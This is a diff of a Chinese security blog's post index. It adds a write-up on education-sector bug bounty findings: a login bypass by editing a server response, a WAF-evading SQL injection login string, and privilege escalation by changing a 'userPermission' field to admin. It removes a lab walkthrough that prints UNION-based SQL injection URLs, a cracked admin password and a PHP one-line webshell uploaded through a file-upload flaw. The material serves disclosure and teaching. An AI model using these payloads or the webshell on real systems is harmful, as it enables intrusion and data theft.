-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/MFP1%28PB5%7B~%40_J4I5S%25S~SIQ.png" alt=""><br>
-抓取返回包进行观察，发现一个控制用户权限的字段<code>userPermission</code>，这里是user<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%28%24A%29GMXU%25%285%7B667%5B%28ZK%60A4U.png" alt=""><br>
-我们把他改成admin，然后发送数据包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/Z%7BW0ERG%25MS5NJAQZ%24WK%24WBK.png" alt=""><br>
-登录成功后，发现拥有了管理员的权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/9ATRN%28%247%29R7%7DNS%7DKY7%25MI%7DR.png" alt=""></p>
-]]></content>
-      <tags>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
     <url>/posts/37998/</url>
     <content><![CDATA[<h1>前言</h1>
@@ -4305,6 +4190,93 @@ waf逻辑如下</p>
 成功拿到密码<br>
 <img src="https://blog-file-1302856486.file.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5BS2N%29%5BR%7BF%7D4OJHTGJ0QDB%7B3.png" alt=""></p>
 <p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
+]]></content>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>src漏洞挖掘实战</title>
+    <url>/posts/24632/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>好久没更新博客了，消失了快两个礼拜，去尝试摸了一下edusrc。本来打算弄个证书，但好像证书站简单的漏洞都被大师傅们给挖没了，一直出不来洞，QAQ…开篇文章打算慢慢记一下一些有趣的实战（文中所有提到的漏洞已提交给edusrc平台），整个过程需要脱敏，所以马赛克是避免不了的，大家将就看看啦~</p>
+<h2 id="实战"><a class="header-anchor" href="#实战">¶</a>实战</h2>
+<h3 id="登录逻辑漏洞"><a class="header-anchor" href="#登录逻辑漏洞">¶</a>登录逻辑漏洞</h3>
+<p>开始了开始了，逛了逛发现一个后台，尝试弱口令登录，admin/123456一套怼上去<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/1.png" alt=""><br>
+坑爹的是发现居然点击登录框没有反应，没有响应对应的请求，右键源码查看一下登录框这里的代码<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/2.png" alt=""><br>
+好家伙，居然只是披着一层登录按钮的皮<br>
+<a href="https://imgtu.com/i/6vxGkD"><img src="https://z3.ax1x.com/2021/03/26/6vxGkD.gif" alt="6vxGkD.gif"></a></p>
+<p>继续翻看源码，看见登录处理的逻辑，并且发现逻辑校验登录成功后会跳转到<code>main.php</code><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/3.png" alt=""><br>
+心中一喜，可能有戏，直接url换成<code>main.php</code>访问<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/4.png" alt=""><br>
+但进去后，马上弹了一个框又给我踢了出来<br>
+<a href="https://imgtu.com/i/6xSOw6"><img src="https://z3.ax1x.com/2021/03/26/6xSOw6.jpg" alt="6xSOw6.jpg"></a><br>
+我们抓包看看，猜测应该有个文件是校验登录的<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/5.png" alt=""><br>
+抓包<code>main.php</code>，放包后，果然看见了一个<code>session.php</code>，这应该是校验登录结果的文件，我们右键抓一个<code>session.php</code>的返回包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/6.png" alt=""><br>
+看见了返回的登录结果，解码一下是刚刚弹的框的文字<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/7.png" alt=""><br>
+见证奇迹的时候到了，我们把后面的errMsg给删除，然后把false改成true，这波我单走一个true给你<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/8.png" alt=""><br>
+接着我们放包，成功进来了后台<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/9.png" alt=""><br>
+<a href="https://imgtu.com/i/6xSAG4"><img src="https://z3.ax1x.com/2021/03/26/6xSAG4.jpg" alt="6xSAG4.jpg"></a></p>
+<p>告辞，水完一篇了~</p>
+<h3 id="随笔"><a class="header-anchor" href="#随笔">¶</a>随笔</h3>
+<p>2021年3月11号开始，笔者第一次接触src漏洞挖掘，下面贴图的是第一个漏洞通过审核收到的邮件<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%94/O5P%5BCHZ0M1%24%7D%7D6XZ7R%403LBJ.png" alt=""><br>
+接下来，就是磕磕绊绊的尝试挖掘更多的站点，在4月份4号的时候终于成功拿到了属于自己的证书，完成了自己定的一个月内拿到证书的目标，很开心。<br>
+有证书的学校站点开了这么久，被一个又一个大师傅光顾了这么多次并且提交了大量漏洞，能再找到洞对我来说实属不易，过程坎坎坷坷，但终于还是完成了目标，现在心情好了起来，继续更新嘿嘿！<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%40%5B%60%7BFZQHOQ6EI%5BY95%60AJT%25F.png" alt=""></p>
+<h3 id="可惜的sql注入漏洞"><a class="header-anchor" href="#可惜的sql注入漏洞">¶</a>可惜的sql注入漏洞</h3>
+<p>还是逛逛又到了一个后台，熟悉的一套弱口令打上去，失败了</p>
+<p><a href="https://imgtu.com/i/c8IEmn"><img src="https://z3.ax1x.com/2021/04/07/c8IEmn.gif" alt="c8IEmn.gif"></a></p>
+<p>随手再测一个单引号<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2PC%7D%29LWZ2EE5VW72CJ%28%60KFS.png" alt=""><br>
+好兄弟，出奇迹了<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/U15%7BMVI%5D%5DDQ6C%24_Z%284BIX_0.png" alt=""><br>
+这百分之99.9存在sql注入啊<br>
+<a href="https://imgtu.com/i/c8O5TJ"><img src="https://z3.ax1x.com/2021/04/07/c8O5TJ.gif" alt="c8O5TJ.gif"></a><br>
+嘿嘿，尝试一波万能密码登录<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/A968%25S4%7DL%7B~0I2X%249T%29P2RM.png" alt=""><br>
+<a href="https://imgtu.com/i/c8X8nU"><img src="https://z3.ax1x.com/2021/04/07/c8X8nU.jpg" alt="c8X8nU.jpg"></a><br>
+有waf，看起来是老版本的D盾，fuzz一下<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/2S8_O%24V%5DXZFELN7%7DCEFIGRB.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/%5B6%5B4FBGB%28LXA5T8SEF%29%251YH.png" alt=""><br>
+结果是把<code>=</code>和<code>-</code>都给ban了，总结了一下信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站数据库为sqlserver</span><br><span class="line">fuzz出sql语句应该是</span><br><span class="line">select * from user where user&#x3D;&#39;&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>在网上找了一些姿势都没利用成功，无奈只好闭合语句尝试fuzz一波密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;号被waf拦截的话用like替代</span><br><span class="line">语句也就是&#39;or&#39;1&#39;like&#39;1</span><br><span class="line"></span><br><span class="line">放到sql语句里就是select * from user where user&#x3D;&#39;&#39;or&#39;1&#39;like&#39;1&#39; and and User_role&#x3D;&#39;管理员&#39; and passwd&#x3D;&#39;&#39;</span><br><span class="line"></span><br><span class="line">接着跑密码字典</span><br></pre></td></tr></table></figure>
+<p>没想到，密码123就登录成功了，嘿嘿，看来网站数据库里有用户密码是123<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E5%8F%AF%E6%83%9C%E7%9A%84sql%E6%B3%A8%E5%85%A5/35b9af4c7fc405e94804e34b80cfde62_adc840d6-c7e5-42b6-846d-18212af3e7d2-ITL7TzPR.png" alt=""><br>
+但可惜的是，在审核期间，网站就被学校管理员关站了，导致审核不通过；但总归还是好的，又成功减少了一个网络危害</p>
+<h3 id="随笔2"><a class="header-anchor" href="#随笔2">¶</a>随笔2</h3>
+<p>最近很忙，以至于博客很久也没有来更新，今天省hw结束了，随即打算更新一下文章；思绪从哪里开始讲起呢？从3月份中旬开始学习漏洞挖掘开始吧，一开始其实没有打算先接触src漏洞挖掘，因为觉得自己还需要更多知识来沉淀自己，但为了在4月底的省hw拿个好名次，也就不得不开始去学习一下，好在结果还算满意，最后离结束只剩几个小时的时候用三个0day埋伏了一手，稳稳拿下了省hw高校第一；想起这一个月的学习，还是蛮惊讶的，发现自己在一个月的时间陆陆续续获得了上海交通大学、同济大学、兰州大学、南开大学、东北林业大学、常熟理工、上海外国语等学校颁发的漏洞证书，下面贴几张已经收到的图片吧<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG20210924232613.jpg" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/IMG_20210414_114939.jpg" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838122349.jpg" alt=""></p>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619838030290.jpg" alt=""></p>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%9A%8F%E7%AC%942/qq_pic_merged_1619837999884.jpg" alt=""></p>
+<p>到底还是最后逼了自己一把，还是那句话，有付出才会有收获；后面估计很长一段时间不会再进行src的漏洞挖掘了，打算把精力转向基础知识的学习</p>
+<h3 id="逻辑漏洞-垂直越权"><a class="header-anchor" href="#逻辑漏洞-垂直越权">¶</a>逻辑漏洞-垂直越权</h3>
+<p>这个洞纯属偶然，在刷手机的时候，无意发现的学校的网址，用电脑访问了之后是一个登录页面<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%60JOP7W%7D%29%5B7%40E_%24U6D0LG~G6.png" alt="">可以注册，注册了一个账号<br>
+账号：3150103968<br>
+密码：12345678<br>
+然后登陆，进去是普通的用户权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/JQFF554I%5BK%40VMAB1VMC_%60SC.png" alt=""><br>
+然后退出登录，回到登录框这里，用burpsuite抓取登录的数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/MFP1%28PB5%7B~%40_J4I5S%25S~SIQ.png" alt=""><br>
+抓取返回包进行观察，发现一个控制用户权限的字段<code>userPermission</code>，这里是user<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/%28%24A%29GMXU%25%285%7B667%5B%28ZK%60A4U.png" alt=""><br>
+我们把他改成admin，然后发送数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/Z%7BW0ERG%25MS5NJAQZ%24WK%24WBK.png" alt=""><br>
+登录成功后，发现拥有了管理员的权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/src%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/9ATRN%28%247%29R7%7DNS%7DKY7%25MI%7DR.png" alt=""></p>
 ]]></content>
       <tags>
         <tag>渗透</tag>
@@ -4530,134 +4502,6 @@ waf逻辑如下</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>模拟网站攻击到提权的全部过程</title>
-    <url>/posts/46463/</url>
-    <content><![CDATA[<h1>前言</h1>
-<p>今天去给新一届的学生演示一次网站拿webshell到系统提权的过程，但不幸的是中间翻车了，老年人紧张得忘记了msf监听木马的指令，然后哆哆嗦嗦的在大家眼下，打开了笔记查看一下2333…所以更新一下博客，给自己一个教训QWQ。</p>
-<h1>准备工作</h1>
-<p>靶机（被攻击方）：win7系统<br>
-入侵者（攻击方）：win10系统、kali系统</p>
-<p>首先启动win7系统，搭建一个常见的校园网站，然后映射到局域网，使得我们能正常访问<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png" alt=""></p>
-<h1>从网站拿到webshell</h1>
-<h2 id="sql注入漏洞"><a class="header-anchor" href="#sql注入漏洞">¶</a>sql注入漏洞</h2>
-<p>把整个网站浏览完一遍后，我们发现这里的url为?id=10结尾，我们猜测可能是一个sql注入点<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png" alt=""><br>
-首先我们在id=10后面加上一个单引号’进行判断<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png" alt=""><br>
-这个时候我们发现回显的数据不正常，于是我们再加一个注释符号<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png" alt=""><br>
-发现数据这个时候回显的时候是正常的，到这一步我们已经可以确定这里存在一个sql注入漏洞</p>
-<blockquote>
-<p>原理我们可以简单解释一下<br>
-在网站中，我们一般使用数据库存储网站数据，网站和数据库是存在一个交互性。网站所呈现的内容是由代码中写入的sql语句调用数据库中的内容进行一个呈现，例如我们刚刚看到的文字。<br>
-而sql注入漏洞一般是由于程序员书写的sql语句不规范所导致的安全事件。</p>
-</blockquote>
-<p>例如网站源码中使用如下的sql语句进行查询<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png" alt=""><br>
-给语句结尾的where查询条件加上一个单引号’<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png" alt=""><br>
-很显然，我们传入的单引号和前面的单引号闭合，后面只有一个无法成对的单引号，然后报了语法错误。这个时候我们再加上<code>--+</code>注释符号注释掉后面的单引号<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png" alt=""><br>
-这个时候查询的数据就会正确回显出来。</p>
-<p>原理简单解释了一下之后，我们回到刚刚的网站。<br>
-这个时候我们发现存在sql注入漏洞之后，我们就开始进行查询对方网站数据库的数据，找到一些敏感信息，例如管理员的账号密码等等</p>
-<p>首先，我们使用order by语句快速猜解出表中的列数<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png" alt=""><br>
-发现10列的时候报错，说明不足10列，我们继续缩小范围<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png" alt=""><br>
-再查询第8列的时候，发现数据回显正确，说明对方表中含有列数8<br>
-我们使用union select 自定义查询测试一下，注意我们这里前面的id=10，要写成id=-10，把这里的查询置空<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png" alt=""><br>
-发现会分别回显第三列、第五列和第七列。接下来我们就可以在三、五、七处做做文章</p>
-<p>查询数据库名字：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,database(),4,5,6,7,8--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png" alt=""><br>
-得到数据库名字：qzn_zuiai</p>
-<p>查询数据库中的表名：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,group_concat(table_name),4,5,6,7,8 from information_schema.tables where table_schema=&quot;qzn_zuiai&quot;--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png" alt=""><br>
-得到一共se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3sk九张表<br>
-通过表名，我们猜测se2admin可能是存储管理员账号和密码的表，所以我们先查询这张表中的数据</p>
-<p>查询表se2admin中的字段：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,group_concat(column_name),4,5,6,7,8 from information_schema.columns where table_name=&quot;se2admin&quot;--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png" alt=""><br>
-得到表中的字段值有id，name，pass等，接下来我们查询name和pass的字段值</p>
-<p>查询字段值：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,name,4,pass,6,7,8 from se2admin--+</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png" alt=""><br>
-我们得到管理员账号：admin，管理员账号密码：7fef6171469e80d32c0559f88b377245<br>
-很显然密码值是被加密的md5值，所以我们去网上找md5网站进行撞库查询<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png" alt=""><br>
-得到管理员密码为：admin888<br>
-接下来我们需要查找这个网站的后台地址，我们使用御剑进行一个扫描<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png" alt=""><br>
-御剑爆出了很多敏感地址，我们找到一个admin的目录，可能是后台地址，我们去访问一下<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png" alt=""><br>
-输入我们刚刚得到的管理员账号和密码admin:admin888<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png" alt=""><br>
-这个时候，我们成功进入对方网站后台。</p>
-<h2 id="文件上传漏洞"><a class="header-anchor" href="#文件上传漏洞">¶</a>文件上传漏洞</h2>
-<p>接下来我们再这里找到一个文件上传点<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png" alt=""><br>
-我们写一个简单的一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png" alt=""><br>
-考虑到这里可能会对我们上传的文件进行一个后缀限制，例如只能上传jpg或者png图片格式文件等，所以我们把muma.txt改成muma.jpg格式<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png" alt=""><br>
-我们开启burpsuite，然后点提交，拦截到我们发送的数据包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png" alt=""><br>
-我们把muma.jpg改回php文件类型：muma.php<br>
